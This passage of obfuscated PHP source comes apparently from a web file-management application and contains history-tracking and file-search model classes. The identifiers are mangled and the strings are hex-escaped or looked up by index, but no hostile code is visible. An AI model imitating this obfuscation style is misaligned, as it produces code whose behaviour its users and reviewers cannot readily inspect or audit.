$Úò¦£›³[508] => $Öñê¿Ü[$Úò¦£›³[233]], $Úò¦£›³[1766] => $Úò¦£›³[12])); } return $this->eventListParse($Ù®ÁØ, $¿Õ—ÅÛİ); } private function eventListParse($…¹ù…ù, $×È‚³ùß) { $­°¿¸Ü´ =& $_SERVER[´È¥ö†ö]; $›Ìó†çä = $…¹ù…ù[$­°¿¸Ü´[456]]; $ñ•‹ªÛÎ = array_to_keyvalue($›Ìó†çä, $­°¿¸Ü´[12], $­°¿¸Ü´[193]); $–­¥Ÿßö = array_to_keyvalue($›Ìó†çä, $­°¿¸Ü´[12], $­°¿¸Ü´[2208]); foreach ($›Ìó†çä as $¤ÏŸá“È) { $áÛ¹€½ó = $¤ÏŸá“È[$­°¿¸Ü´[537]]; if ($¤ÏŸá“È[$­°¿¸Ü´[33]] == $­°¿¸Ü´[634] && isset($áÛ¹€½ó[$­°¿¸Ü´[1240]])) { $ñ•‹ªÛÎ[] = $áÛ¹€½ó[$­°¿¸Ü´[1240]] . $­°¿¸Ü´[12]; $ñ•‹ªÛÎ[] = $áÛ¹€½ó[$­°¿¸Ü´[1241]] . $­°¿¸Ü´[12]; } if ($¤ÏŸá“È[$­°¿¸Ü´[33]] == $­°¿¸Ü´[2219] && isset($áÛ¹€½ó[$­°¿¸Ü´[193]])) { $ñ•‹ªÛÎ[] = $áÛ¹€½ó[$­°¿¸Ü´[193]] . $­°¿¸Ü´[12]; } } $ñ•‹ªÛÎ = array_merge($ñ•‹ªÛÎ, $–­¥Ÿßö, array($×È‚³ùß . $­°¿¸Ü´[12])); $ñ•‹ªÛÎ = array_unique($ñ•‹ªÛÎ); $¡¯§Õ¸ = array_unique(array_to_keyvalue($›Ìó†çä, $­°¿¸Ü´[12], $­°¿¸Ü´[1773])); $ç¦ùÇ™ğ = Model($­°¿¸Ü´[608])->userListInfo($¡¯§Õ¸); $ûöÄ÷­— = Model($­°¿¸Ü´[901])->sourceListInfo($ñ•‹ªÛÎ, !0); foreach ($›Ìó†çä as &$¤ÏŸá“È) { if ($¤ÏŸá“È[$­°¿¸Ü´[33]] == $­°¿¸Ü´[634] && isset($¤ÏŸá“È[$­°¿¸Ü´[537]][$­°¿¸Ü´[1240]])) { $¤ÏŸá“È[$­°¿¸Ü´[537]][$­°¿¸Ü´[1240]] = $ûöÄ÷­—[$¤ÏŸá“È[$­°¿¸Ü´[537]][$­°¿¸Ü´[1240]]]; $¤ÏŸá“È[$­°¿¸Ü´[537]][$­°¿¸Ü´[1241]] = $ûöÄ÷­—[$¤ÏŸá“È[$­°¿¸Ü´[537]][$­°¿¸Ü´[1241]]]; } if ($¤ÏŸá“È[$­°¿¸Ü´[33]] == $­°¿¸Ü´[2219] && isset($¤ÏŸá“È[$­°¿¸Ü´[537]][$­°¿¸Ü´[193]])) { $¤ÏŸá“È[$­°¿¸Ü´[537]][$­°¿¸Ü´[193]] = $ûöÄ÷­—[$¤ÏŸá“È[$­°¿¸Ü´[537]][$­°¿¸Ü´[193]]]; } $¤ÏŸá“È[$­°¿¸Ü´[90]] = $ûöÄ÷­—[$¤ÏŸá“È[$­°¿¸Ü´[193]]]; $¤ÏŸá“È[$­°¿¸Ü´[2224]] = $ûöÄ÷­—[$¤ÏŸá“È[$­°¿¸Ü´[2208]]]; if ($¤ÏŸá“È[$­°¿¸Ü´[33]] == $­°¿¸Ü´[1942]) { $¤ÏŸá“È[$­°¿¸Ü´[2224]] = $¤ÏŸá“È[$­°¿¸Ü´[90]]; $¤ÏŸá“È[$­°¿¸Ü´[2208]] = $¤ÏŸá“È[$­°¿¸Ü´[2224]][$­°¿¸Ü´[193]]; $¤ÏŸá“È[$­°¿¸Ü´[90]] = !1; $¤ÏŸá“È[$­°¿¸Ü´[193]] = $­°¿¸Ü´[12]; } $¤ÏŸá“È[$­°¿¸Ü´[2151]] = $ç¦ùÇ™ğ[$¤ÏŸá“È[$­°¿¸Ü´[1773]]]; } unset($¤ÏŸá“È); $…¹ù…ù[$­°¿¸Ü´[456]] = $›Ìó†çä; return $…¹ù…ù; } public function removeBySource($µˆòÌ‰‹) { $ˆ­»Šèº = array($_SERVER[´È¥ö†ö][502] => $µˆòÌ‰‹); $this->where($ˆ­»Šèº)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\143\x65\x5f\x68\x69\163\x74\x6f\162\x79"; public function historyCount($µœªÑ‰Ê) { $÷£É…•ï =& $_SERVER[´È¥ö†ö]; if (!$µœªÑ‰Ê) { return array(); } if (is_string($µœªÑ‰Ê) || is_int($µœªÑ‰Ê)) { $µœªÑ‰Ê = array($µœªÑ‰Ê); } $–Ş¡ÅñŠ = array($÷£É…•ï[193], $÷£É…•ï[2225] => $÷£É…•ï[576]); $™ß¢ğ°ş = array($÷£É…•ï[193] => array($÷£É…•ï[7], $µœªÑ‰Ê)); $êıÄÆı = $this->field($–Ş¡ÅñŠ)->where($™ß¢ğ°ş)->group($÷£É…•ï[193])->select(); return array_to_keyvalue($êıÄÆı, $÷£É…•ï[193], $÷£É…•ï[576]); } public function addHistory($µÑ¨ÇïÖ, $†®×™¾¸ = '') { $Ôİ…Ì¦Æ =& $_SERVER[´È¥ö†ö]; $Ë†ÒãŠÉ = array($Ôİ…Ì¦Æ[502] => $µÑ¨ÇïÖ[$Ôİ…Ì¦Æ[193]], $Ôİ…Ì¦Æ[1764] => isset($µÑ¨ÇïÖ[$Ôİ…Ì¦Æ[540]]) ? $µÑ¨ÇïÖ[$Ôİ…Ì¦Æ[540]] : $µÑ¨ÇïÖ[$Ôİ…Ì¦Æ[538]], $Ôİ…Ì¦Æ[553] => $µÑ¨ÇïÖ[$Ôİ…Ì¦Æ[552]], $Ôİ…Ì¦Æ[631] => $µÑ¨ÇïÖ[$Ôİ…Ì¦Æ[79]], $Ôİ…Ì¦Æ[2226] => $†®×™¾¸); if ($GLOBALS[$Ôİ…Ì¦Æ[6]][$Ôİ…Ì¦Æ[92]][$Ôİ…Ì¦Æ[1301]] >= 1) { $this->historyAutoClear($Ë†ÒãŠÉ[$Ôİ…Ì¦Æ[193]]); $this->add($Ë†ÒãŠÉ); } Hook::trigger($Ôİ…Ì¦Æ[2227], $Ë†ÒãŠÉ); Model($Ôİ…Ì¦Æ[2228])->eventFileEdit($µÑ¨ÇïÖ[$Ôİ…Ì¦Æ[193]]); } private function historyAutoClear($Ø‹ĞÆŸ) { $–À³Ç‘í =& $_SERVER[´È¥ö†ö]; $ƒğì›¢ = Model($–À³Ç‘í[846])->get($–À³Ç‘í[1323]); $†‡í¹™« = intval($GLOBALS[$–À³Ç‘í[6]][$–À³Ç‘í[92]][$–À³Ç‘í[1301]]); $›š¥ƒñ = $ƒğì›¢ == $–À³Ç‘í[1324] ? min(5, $†‡í¹™«) : $†‡í¹™«; $›š¥ƒñ = $›š¥ƒñ <= 0 ? 0 : $›š¥ƒñ - 1; if ($›š¥ƒñ >= 499) { return; } $õÏò„ñá = array($–À³Ç‘í[502] => $Ø‹ĞÆŸ); $”şÅÖ¤ú = $this->field($–À³Ç‘í[2229])->where($õÏò„ñá)->order($–À³Ç‘í[2222])->select(); if (!$”şÅÖ¤ú || $›š¥ƒñ >= count($”şÅÖ¤ú)) { return; } $ö¿—õ© = array_to_keyvalue($”şÅÖ¤ú, $–À³Ç‘í[12], $–À³Ç‘í[486]); $ö¿—õ© = array_slice($ö¿—õ©, $›š¥ƒñ); $ò¼­£Ç = array_to_keyvalue($”şÅÖ¤ú, $–À³Ç‘í[12], $–À³Ç‘í[552]); $ò¼­£Ç = array_slice($ò¼­£Ç, $›š¥ƒñ); if (!$ö¿—õ© || !$ò¼­£Ç) { return; } $õÏò„ñá = array($–À³Ç‘í[504] => array($–À³Ç‘í[7], $ö¿—õ©)); $this->where($õÏò„ñá)->delete(); Model($–À³Ç‘í[555])->remove($ò¼­£Ç); } public function listData($â¼ğ¬Õ–) { $’Œ¥éà› =& $_SERVER[´È¥ö†ö]; $ˆáÓğñè = array($’Œ¥éà›[502] => $â¼ğ¬Õ–); $ûÅö°¹­ = $’Œ¥éà›[2230]; $ƒş¡´üÑ = $this->field($ûÅö°¹­)->where($ˆáÓğñè)->order($’Œ¥éà›[2222])->selectPage(); $this->_listAppendUser($ƒş¡´üÑ[$’Œ¥éà›[456]]); $ĞõÛÀ¢“ = Model($’Œ¥éà›[846])->get($’Œ¥éà›[1323]); $âŒˆèÌå = 5; if ($ĞõÛÀ¢“ == $’Œ¥éà›[1324]) { $ƒş¡´üÑ[$’Œ¥éà›[456]] = array_slice($ƒş¡´üÑ[$’Œ¥éà›[456]], 0, $âŒˆèÌå); $ƒş¡´üÑ[$’Œ¥éà›[453]] = array($’Œ¥éà›[2231] => 1, $’Œ¥éà›[2232] => 20, $’Œ¥éà›[2233] => 1, $’Œ¥éà›[2234] => count($ƒş¡´üÑ[$’Œ¥éà›[456]])); } return $ƒş¡´üÑ; } protected function _listAppendUser(&$˜ÚãìÈ³) { $©Õ­Æ¢Í =& $_SERVER[´È¥ö†ö]; $ı´®Öìƒ = array_to_keyvalue($˜ÚãìÈ³, $©Õ­Æ¢Í[12], $©Õ­Æ¢Í[1773]); $¡’·ëÈÜ = Model($©Õ­Æ¢Í[608])->userListInfo($ı´®Öìƒ); foreach ($˜ÚãìÈ³ as &$Êƒ÷£¤õ) { $ÆÇ™±Š° = $Êƒ÷£¤õ[$©Õ­Æ¢Í[1773]]; $Êƒ÷£¤õ[$©Õ­Æ¢Í[538]] = $¡’·ëÈÜ[$ÆÇ™±Š°] ? $¡’·ëÈÜ[$ÆÇ™±Š°] : !1; } unset($Êƒ÷£¤õ); } public function fileInfo($èşãï÷¬) { $³ç‘ü” =& $_SERVER[´È¥ö†ö]; $×¢¯ı = $this->tablePrefix; $¶¡¨½úø = "{$×¢¯ı}\x69\157\137\x66\151\x6c\x65\40\146\x69\154\145\x73\x20\x6f\x6e\x20\146\151\x6c\145\x73\x2e\x66\x69\154\x65\x49\x44\x20\x3d\40\150\151\163\x74\x6f\162\171\56\x66\x69\x6c\x65\111\x44"; return $this->alias($³ç‘ü”[2235])->where(array($³ç‘ü”[504] => $èşãï÷¬))->join($¶¡¨½úø, $³ç‘ü”[2236])->find(); } public function removeItem($îõ˜åæâ) { $ãªÙ÷Ê¿ =& $_SERVER[´È¥ö†ö]; $†âœëş = array($ãªÙ÷Ê¿[504] => $îõ˜åæâ); $ô¦•—Î¤ = $this->where($†âœëş)->find(); if ($ô¦•—Î¤) { $Í®ûÉ¡İ = $this->where($†âœëş)->delete(); Model($ãªÙ÷Ê¿[555])->remove($ô¦•—Î¤[$ãªÙ÷Ê¿[552]]); return $Í®ûÉ¡İ; } return !1; } public function removeBySource($ûçïó‚Ô) { $¡­éÚ° =& $_SERVER[´È¥ö†ö]; if (!$ûçïó‚Ô) { return !1; } if (!is_array($ûçïó‚Ô)) { $ûçïó‚Ô = array($ûçïó‚Ô); } $ıëº„°‚ = array($¡­éÚ°[502] => array($¡­éÚ°[7], $ûçïó‚Ô)); $ êôÔ«“ = $this->field($¡­éÚ°[553])->where($ıëº„°‚)->select(); if ($ êôÔ«“) { $this->where($ıëº„°‚)->delete(); $Íƒ²“ÛÂ = array_to_keyvalue($ êôÔ«“, $¡­éÚ°[12], $¡­éÚ°[552]); Model($¡­éÚ°[555])->remove($Íƒ²“ÛÂ); } return !0; } public function setDetail($ùÏ„šˆ, $’ÔåÖ±ü) { $ƒıƒÈŒ¯ =& $_SERVER[´È¥ö†ö]; return $this->where(array($ƒıƒÈŒ¯[504] => $ùÏ„šˆ))->save(array($ƒıƒÈŒ¯[2226] => $’ÔåÖ±ü)); } public function rollbackToItem($úéÈõŞ”, $­î¡Ş¶) { $Î¿åâÚÃ =& $_SERVER[´È¥ö†ö]; $ÏÛœışì = Model($Î¿åâÚÃ[901])->sourceInfo($úéÈõŞ”); $this->addHistory($ÏÛœışì, LNG($Î¿åâÚÃ[2237])); $ÂÍ™´Â = $this->find($­î¡Ş¶); $ñàÇşü‘ = array($Î¿åâÚÃ[552] => $ÂÍ™´Â[$Î¿åâÚÃ[552]], $Î¿åâÚÃ[79] => $ÂÍ™´Â[$Î¿åâÚÃ[79]], $Î¿åâÚÃ[88] => time(), $Î¿åâÚÃ[540] => USER_ID); Model($Î¿åâÚÃ[901])->where(array($Î¿åâÚÃ[193] => $úéÈõŞ”))->save($ñàÇşü‘); return $this->where(array($Î¿åâÚÃ[504] => $­î¡Ş¶))->delete(); } public function clearSame($‰š–‰Ãï) { $æÔâàœ¯ =& $_SERVER[´È¥ö†ö]; $ŒÎ¢¿¿µ = $this->listData($‰š–‰Ãï); $Í™¶°Ò = array_to_keyvalue_group($ŒÎ¢¿¿µ, $æÔâàœ¯[552]); $ÏÂ£ôš× = array(); $‰í ”ÙÑ = array(); foreach ($Í™¶°Ò as $ò«¦ªİ) { if (!$ò«¦ªİ || count($ò«¦ªİ) <= 1) { continue; } foreach ($ò«¦ªİ as $”õØØ) { $ÏÂ£ôš×[] = $”õØØ[$æÔâàœ¯[552]]; $‰í ”ÙÑ[] = $”õØØ[$æÔâàœ¯[486]]; } } if (!$‰í ”ÙÑ) { return; } $this->where(array($æÔâàœ¯[486] => array($æÔâàœ¯[7], $‰í ”ÙÑ)))->delete(); Model($æÔâàœ¯[555])->remove($ÏÂ£ôš×); } public function userSpace() { $Úøüêš¯ =& $_SERVER[´È¥ö†ö]; $µ½“â¾„ = $this->tablePrefix; $ÅìÖ×Æµ = array($Úøüêš¯[1764] => USER_ID); $®À‘ù«• = "{$µ½“â¾„}\x69\x6f\x5f\x66\151\154\x65\x20\146\151\154\145\x73\x20\x6f\156\40\146\151\x6c\145\x73\x2e\146\151\x6c\145\111\x44\x20\75\40\150\x69\163\164\x6f\162\171\x2e\x66\151\154\145\111\104"; return $this->alias($Úøüêš¯[2235])->where($ÅìÖ×Æµ)->join($®À‘ù«•, $Úøüêš¯[2236])->sum($Úøüêš¯[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ö¶¦Çü) { $¥õ×Ä°„ =& $_SERVER[´È¥ö†ö]; $Ì—ãÌ›³ = KodIO::fileTypeList(); $Š®Â¨Ìî = $Ì—ãÌ›³[$ö¶¦Çü]; if (!$Š®Â¨Ìî) { return array(); } $Ï–ÄÆû = $Š®Â¨Ìî[$¥õ×Ä°„[169]]; $á·ÔîÀ’ = $¥õ×Ä°„[7]; if (!$Š®Â¨Ìî[$¥õ×Ä°„[169]]) { $ïÁàéúĞ = array_to_keyvalue($Ì—ãÌ›³, $¥õ×Ä°„[12], $¥õ×Ä°„[169]); $Ï–ÄÆû = implode($¥õ×Ä°„[50], $ïÁàéúĞ); $á·ÔîÀ’ = $¥õ×Ä°„[2238]; } $£Óñï¦ = explode($¥õ×Ä°„[50], trim($Ï–ÄÆû, $¥õ×Ä°„[50])); return array($á·ÔîÀ’, $£Óñï¦); } public function listPathType($ÀÔ•Ê®ö) { $Ú¿™¿Œ¿ =& $_SERVER[´È¥ö†ö]; $…ñŠŸ†À = $this->fileTypeWhere($ÀÔ•Ê®ö); if (!$…ñŠŸ†À) { return array(); } $…»ğĞ¨ç = USER_ID; $ÑøôÔñ³ = Model($Ú¿™¿Œ¿[608])->getInfo($…»ğĞ¨ç); $‰âçÉ¸ø = array($Ú¿™¿Œ¿[662] => SourceModel::TYPE_USER, $Ú¿™¿Œ¿[595] => array($Ú¿™¿Œ¿[626], $Ú¿™¿Œ¿[604] . $ÑøôÔñ³[$Ú¿™¿Œ¿[90]][$Ú¿™¿Œ¿[193]] . $Ú¿™¿Œ¿[627]), $Ú¿™¿Œ¿[663] => $…»ğĞ¨ç, $Ú¿™¿Œ¿[660] => 0, $Ú¿™¿Œ¿[661] => $…ñŠŸ†À); return $this->listSource($‰âçÉ¸ø); } public function listSearch($˜æğĞŸè, $›„Ğ¥Ì  = 300) { $«Ñåõå =& $_SERVER[´È¥ö†ö]; if (isset($˜æğĞŸè[$«Ñåõå[2072]]) && $˜æğĞŸè[$«Ñåõå[2072]]) { $˜æğĞŸè[$«Ñåõå[2072]] = str_replace($«Ñåõå[471], $«Ñåõå[2239], trim($˜æğĞŸè[$«Ñåõå[2072]])); } $›òø‹ã = $this->_parseSearchWhere($˜æğĞŸè); if (!isset($›òø‹ã[$«Ñåõå[516]])) { $›òø‹ã[$«Ñåõå[516]] = 0; } $éò‡¤û¿ = $«Ñåõå[2240]; $ú«µºáÍ = $›òø‹ã; $ıÁèäÁƒ = $éò‡¤û¿; $this->_listSearchBindPinyin($˜æğĞŸè, $›òø‹ã, $éò‡¤û¿); $this->alias($«Ñåõå[530])->_makeOrder(); $›òø‹ã = $this->parseWhereLike($›òø‹ã); $…—¥àè× = $this->distinct(!0)->field($éò‡¤û¿)->where($›òø‹ã)->selectPage($›„Ğ¥Ì ); if ($GLOBALS[$«Ñåõå[6]][$«Ñåõå[468]][$«Ñåõå[469]] && Input::check($˜æğĞŸè[$«Ñåõå[2072]], $«Ñåõå[669]) && $…—¥àè×[$«Ñåõå[453]][$«Ñåõå[439]] == 1 && $…—¥àè×[$«Ñåõå[453]][$«Ñåõå[454]] == 0) { $…—¥àè× = $this->distinct(!0)->field($éò‡¤û¿)->where($ú«µºáÍ)->limit(1000)->select(); $…—¥àè× = array_page_split($…—¥àè×, !1, $›„Ğ¥Ì ); } $this->_listSearchFileContent($…—¥àè×, $˜æğĞŸè, $ıÁèäÁƒ, $ú«µºáÍ); $this->_listSearchDesc($…—¥àè×, $˜æğĞŸè, $ıÁèäÁƒ); $this->_listSearchTag($…—¥àè×, $˜æğĞŸè, $ıÁèäÁƒ); $this->_listSearchGroupTag($…—¥àè×, $˜æğĞŸè, $ıÁèäÁƒ); $this->_listDataApply($…—¥àè×[$«Ñåõå[456]]); $this->_listMake($…—¥àè×); return $…—¥àè×; } private function _listSearchFileContent(&$÷„õŒø, $ÍßÃöô, $¢º±¯€, $ŸÅÔ›Ù) { $÷¯¾Ô·ı =& $_SERVER[´È¥ö†ö]; if (!$ÍßÃöô[$÷¯¾Ô·ı[2072]] || $÷„õŒø[$÷¯¾Ô·ı[453]][$÷¯¾Ô·ı[439]] > 1) { return; } if (!isset($ŸÅÔ›Ù[$÷¯¾Ô·ı[32]]) || !is_array($ÍßÃöô[$÷¯¾Ô·ı[552]])) { return; } $ŸÅÔ›Ù[$÷¯¾Ô·ı[552]] = array($÷¯¾Ô·ı[7], $ÍßÃöô[$÷¯¾Ô·ı[552]]); unset($ŸÅÔ›Ù[$÷¯¾Ô·ı[32]]); unset($ÍßÃöô[$÷¯¾Ô·ı[552]]); $Œ“Åõñ = $this->field($¢º±¯€)->where($ŸÅÔ›Ù)->limit($÷¯¾Ô·ı[2241])->select(); if (!$Œ“Åõñ || count($Œ“Åõñ) == 0) { return; } $÷„õŒø[$÷¯¾Ô·ı[456]] = array_merge($Œ“Åõñ, $÷„õŒø[$÷¯¾Ô·ı[456]]); $÷„õŒø[$÷¯¾Ô·ı[453]][$÷¯¾Ô·ı[454]] += count($Œ“Åõñ); } private function _listSearchTag(&$ äâªîÈ, $³Š™¼ÅÛ, $†¡™Ç•¥) { $£²â“œ¿ =& $_SERVER[´È¥ö†ö]; if (!$³Š™¼ÅÛ[$£²â“œ¿[2072]] || $ äâªîÈ[$£²â“œ¿[453]][$£²â“œ¿[439]] > 1) { return; } $’šúÁµ… = Model($£²â“œ¿[2242])->listData(); $Ò·‘íÂ¿ = array(); $±ıšŠøî = $³Š™¼ÅÛ[$£²â“œ¿[2072]]; foreach ($’šúÁµ… as $‡ğÀŒ›à) { $°ÛÚõÜÙ = $‡ğÀŒ›à[$£²â“œ¿[32]]; $„€¢Œş = str_replace($£²â“œ¿[53], $£²â“œ¿[12], Pinyin::get($°ÛÚõÜÙ)); if (stripos($°ÛÚõÜÙ, $±ıšŠøî) !== !1 || stripos($„€¢Œş, $±ıšŠøî) !== !1) { $Ò·‘íÂ¿[] = $‡ğÀŒ›à[$£²â“œ¿[486]]; } } if (!$Ò·‘íÂ¿) { return; } $”›ÛÄ¢ = array($£²â“œ¿[511] => array($£²â“œ¿[7], $Ò·‘íÂ¿), $£²â“œ¿[1773] => USER_ID); $›—œ¿ŒÀ = Model($£²â“œ¿[513])->field($£²â“œ¿[87])->where($”›ÛÄ¢)->select(); $›—œ¿ŒÀ = array_to_keyvalue($›—œ¿ŒÀ, $£²â“œ¿[12], $£²â“œ¿[87]); $¦Á¿³ = array_unique($›—œ¿ŒÀ); $this->_listSearchMerge($ äâªîÈ, $³Š™¼ÅÛ, $†¡™Ç•¥, $¦Á¿³); } private function _listSearchDesc(&$Îá±×ï½, $ç°áœ›Î, $ÉË™ë‘Ÿ) { $ÕÇŠ—µû =& $_SERVER[´È¥ö†ö]; if (!$ç°áœ›Î[$ÕÇŠ—µû[2072]] || $Îá±×ï½[$ÕÇŠ—µû[453]][$ÕÇŠ—µû[439]] > 1) { return; } $Õş™ÄÉ = array($ÕÇŠ—µû[97] => $ÕÇŠ—µû[537], $ÕÇŠ—µû[461] => array($ÕÇŠ—µû[470], $ÕÇŠ—µû[2074] . $ç°áœ›Î[$ÕÇŠ—µû[2072]] . $ÕÇŠ—µû[2074])); $ÁçØ«ï = !1; if ($ÁçØ«ï) { $ìúş”×’ = $this->listSearchChildren($ç°áœ›Î[$ÕÇŠ—µû[192]]); $ìúş”×’ = array_unique($ìúş”×’); if (!$ìúş”×’) { return; } $Õş™ÄÉ[$ÕÇŠ—µû[193]] = array($ÕÇŠ—µû[7], $ìúş”×’); } $ÅÍ–ÁË§ = Model($ÕÇŠ—µû[646])->field($ÕÇŠ—µû[193])->where($Õş™ÄÉ)->limit(5000)->select(); $²‡¸ÃèÎ = array_to_keyvalue($ÅÍ–ÁË§, $ÕÇŠ—µû[12], $ÕÇŠ—µû[193]); $this->_listSearchMerge($Îá±×ï½, $ç°áœ›Î, $ÉË™ë‘Ÿ, $²‡¸ÃèÎ); } private function _listSearchGroupTag(&$©Ğà©×ğ, $Æ²ÍÚÜı, $Ğõ ñç) { $ŠÌ‚ãõ =& $_SERVER[´È¥ö†ö]; if (!$Æ²ÍÚÜı[$ŠÌ‚ãõ[2072]] || $©Ğà©×ğ[$ŠÌ‚ãõ[453]][$ŠÌ‚ãõ[439]] > 1 || !$Æ²ÍÚÜı[$ŠÌ‚ãõ[192]]) { return; } $å±éå„ı = $this->sourceInfo($Æ²ÍÚÜı[$ŠÌ‚ãõ[192]]); if (!$å±éå„ı || $å±éå„ı[$ŠÌ‚ãõ[190]] != SourceModel::TYPE_GROUP) { return; } $¸ñ™¸Èü = $å±éå„ı[$ŠÌ‚ãõ[580]]; $¸†÷¨‚¹ = Model($ŠÌ‚ãõ[2243])->get($¸ñ™¸Èü); $é˜°ìÏŸ = array(); $‡Êü›•Ö = $Æ²ÍÚÜı[$ŠÌ‚ãõ[2072]]; foreach ($¸†÷¨‚¹[$ŠÌ‚ãõ[456]] as $«¹µ¹) { $¼¼ºî™æ = $«¹µ¹[$ŠÌ‚ãõ[32]]; $úïğİ¨ª = str_replace($ŠÌ‚ãõ[53], $ŠÌ‚ãõ[12], Pinyin::get($¼¼ºî™æ)); if (stripos($¼¼ºî™æ, $‡Êü›•Ö) !== !1 || stripos($úïğİ¨ª, $‡Êü›•Ö) !== !1) { $é˜°ìÏŸ[] = $«¹µ¹[$ŠÌ‚ãõ[486]]; } } if (!$é˜°ìÏŸ) { return; } $’Àæ¶ = array($ŠÌ‚ãõ[511] => array($ŠÌ‚ãõ[7], $é˜°ìÏŸ), $ŠÌ‚ãõ[1773] => 0, $ŠÌ‚ãõ[33] => $ŠÌ‚ãõ[2094] . $¸ñ™¸Èü); $¡˜Õ»¯ = Model($ŠÌ‚ãõ[513])->field($ŠÌ‚ãõ[87])->where($’Àæ¶)->select(); $¡˜Õ»¯ = array_to_keyvalue($¡˜Õ»¯, $ŠÌ‚ãõ[12], $ŠÌ‚ãõ[87]); $‰øßÉÍ = array_unique($¡˜Õ»¯); $this->_listSearchMerge($©Ğà©×ğ, $Æ²ÍÚÜı, $Ğõ ñç, $‰øßÉÍ); } private function _listSearchMerge(&$Â‹ÛÌª³, $å”¸¹˜, $Ğû¿¼¼, $óØ‘é) { $Ï‹Ò™†¬ =& $_SERVER[´È¥ö†ö]; if (!$óØ‘é) { return; } $ª¶ê€Ğí = array_to_keyvalue($Â‹ÛÌª³[$Ï‹Ò™†¬[456]], $Ï‹Ò™†¬[12], $Ï‹Ò™†¬[193]); $ßâüï¡² = array_diff($óØ‘é, $ª¶ê€Ğí); if (!$ßâüï¡²) { return; } $êëÜƒò = array($Ï‹Ò™†¬[193] => array($Ï‹Ò™†¬[7], $ßâüï¡²)); $¶è˜‘ä„ = $this->field($Ğû¿¼¼)->where($êëÜƒò)->select(); if (!$¶è˜‘ä„) { return; } $ˆÙ¡£‰Ö = array(); foreach ($¶è˜‘ä„ as $ÃÈŠìò“) { if ($this->_listSearchFilter($ÃÈŠìò“, $å”¸¹˜)) { $ˆÙ¡£‰Ö[] = $ÃÈŠìò“; } } $Â‹ÛÌª³[$Ï‹Ò™†¬[456]] = array_merge($ˆÙ¡£‰Ö, $Â‹ÛÌª³[$Ï‹Ò™†¬[456]]); $Â‹ÛÌª³[$Ï‹Ò™†¬[453]][$Ï‹Ò™†¬[454]] += count($ˆÙ¡£‰Ö); } private function _listSearchFilter($õ Ó›·€, $©Ø—³êª) { $«èŸÖ =& $_SERVER[´È¥ö†ö]; $«İŸ”åÈ = $õ Ó›·€[$«èŸÖ[496]] == $«èŸÖ[91]; if (!strstr($õ Ó›·€[$«èŸÖ[595]], $«èŸÖ[50] . $©Ø—³êª[$«èŸÖ[192]] . $«èŸÖ[50])) { return !1; } if (isset($©Ø—³êª[$«èŸÖ[497]]) && $©Ø—³êª[$«èŸÖ[497]] != $«èŸÖ[852]) { if ($©Ø—³êª[$«èŸÖ[497]] == $«èŸÖ[78] && !$«İŸ”åÈ) { return !1; } if ($©Ø—³êª[$«èŸÖ[497]] != $«èŸÖ[78] && $«İŸ”åÈ) { return !1; } if (!strstr($õ Ó›·€[$«èŸÖ[169]], $«èŸÖ[50] . $©Ø—³êª[$«èŸÖ[497]] . $«èŸÖ[50])) { return !1; } } if (isset($©Ø—³êª[$«èŸÖ[2244]]) && $©Ø—³êª[$«èŸÖ[2244]] < $õ Ó›·€[$«èŸÖ[79]]) { return !1; } if (isset($©Ø—³êª[$«èŸÖ[2245]]) && $©Ø—³êª[$«èŸÖ[2245]] > $õ Ó›·€[$«èŸÖ[79]]) { return !1; } if (isset($©Ø—³êª[$«èŸÖ[676]]) && $©Ø—³êª[$«èŸÖ[676]] != $õ Ó›·€[$«èŸÖ[540]]) { return !1; } return !0; } public function listSearchChildren($öÉ°üù´, $×ˆÛ•‹´ = 5000) { $¹§æá­… =& $_SERVER[´È¥ö†ö]; $±“™ş·æ = array(); $ó„çø½Û = $this->sourceInfo($öÉ°üù´); $¼–¾äú = array($¹§æá­…[595] => array($¹§æá­…[470], $ó„çø½Û[$¹§æá­…[595]] . $ó„çø½Û[$¹§æá­…[193]] . $¹§æá­…[627])); $×Ù°ºûŞ = $this->field($¹§æá­…[79])->where($¼–¾äú)->limit($×ˆÛ•‹´ + 1)->select(); $çà¿Ú³ù = is_array($×Ù°ºûŞ) ? count($×Ù°ºûŞ) : 0; if ($çà¿Ú³ù > $×ˆÛ•‹´) { return $this->_listSearchChildrenNear($öÉ°üù´, $×ˆÛ•‹´); } $ŠÓı·îÃ = $this->field($¹§æá­…[193])->where($¼–¾äú)->select(); $±“™ş·æ = array_to_keyvalue($ŠÓı·îÃ, $¹§æá­…[12], $¹§æá­…[193]); return $±“™ş·æ; } private function _listSearchChildrenNear($£ñüƒ‚, $çù¤´“Ë) { $•üĞ±Ğ =& $_SERVER[´È¥ö†ö]; $Ô«Ç¼Ã = array(); $Ï·ŠÔõÔ = array($•üĞ±Ğ[192] => $£ñüƒ‚); $ğ¯ş´Œş = $this->field($•üĞ±Ğ[2246])->where($Ï·ŠÔõÔ)->select(); $ñÔÎÜÃé = array_to_keyvalue(array_filter_by_field($ğ¯ş´Œş, $•üĞ±Ğ[496], $•üĞ±Ğ[91]), $•üĞ±Ğ[12], $•üĞ±Ğ[193]); $Ô«Ç¼Ã = array_merge($Ô«Ç¼Ã, array_to_keyvalue($ğ¯ş´Œş, $•üĞ±Ğ[12], $•üĞ±Ğ[193])); if (!$ñÔÎÜÃé) { return $Ô«Ç¼Ã; } $Ï·ŠÔõÔ = array($•üĞ±Ğ[192] => array($•üĞ±Ğ[7], $ñÔÎÜÃé)); $ğ¯ş´Œş = $this->field($•üĞ±Ğ[2246])->where($Ï·ŠÔõÔ)->limit($çù¤´“Ë)->select(); $Ô«Ç¼Ã = array_merge($Ô«Ç¼Ã, array_to_keyvalue($ğ¯ş´Œş, $•üĞ±Ğ[12], $•üĞ±Ğ[193])); $Ô«Ç¼Ã = array_slice($Ô«Ç¼Ã, 0, intval($çù¤´“Ë)); return $Ô«Ç¼Ã; } private function _listSearchBindPinyin($¼¬Ó‘òï, &$ ·¡Ù†ç, &$ãêà•­ç) { $Ó­¢êŠ¿ =& $_SERVER[´È¥ö†ö]; if (!isset($¼¬Ó‘òï[$Ó­¢êŠ¿[2072]]) || !$¼¬Ó‘òï[$Ó­¢êŠ¿[2072]]) { return; } if (!Input::check($¼¬Ó‘òï[$Ó­¢êŠ¿[2072]], $Ó­¢êŠ¿[404]) || strlen($¼¬Ó‘òï[$Ó­¢êŠ¿[2072]]) < 2) { return; } $˜£óÜÆ = 